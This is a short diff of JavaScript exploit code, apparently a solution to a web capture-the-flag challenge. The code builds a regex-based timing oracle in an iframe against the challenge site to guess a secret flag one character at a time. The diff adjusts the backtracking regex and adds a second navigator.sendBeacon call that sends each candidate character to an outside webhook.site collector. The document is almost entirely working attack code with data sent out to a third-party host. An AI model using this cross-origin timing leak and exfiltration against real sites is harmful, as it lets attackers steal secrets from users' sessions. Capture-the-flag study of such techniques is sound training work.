@@ -25,7 +25,7 @@ async function ini(c){
 }
 
 async function test(c){
-    delay_iframe.src=`https://computeration-fixed.web.jctf.pro/#^(?=${flag+c}).*.*.*.*.*.*.*.*.*!$`;
+    delay_iframe.src=`https://computeration-fixed.web.jctf.pro/#^(?=${flag+c}).*.*.*.*.*.*.*.*!$`;
     let iframee2 = document.createElement('iframe');
     iframee2.src="https://computeration-fixed.web.jctf.pro";
     document.body.appendChild(iframee2);
@@ -55,6 +55,7 @@ async function start(){
         for (let c of candidate){
             navigator.sendBeacon("https://webhook.site/ebf8aa6a-e1af-40da-98bc-c8c64d920b0b",c);
             await ini(c);
+            navigator.sendBeacon("https://webhook.site/ebf8aa6a-e1af-40da-98bc-c8c64d920b0b",c);
             let time_change = date_time1-date_time0;
             console.log(time_change);
             if(time_change>3000){
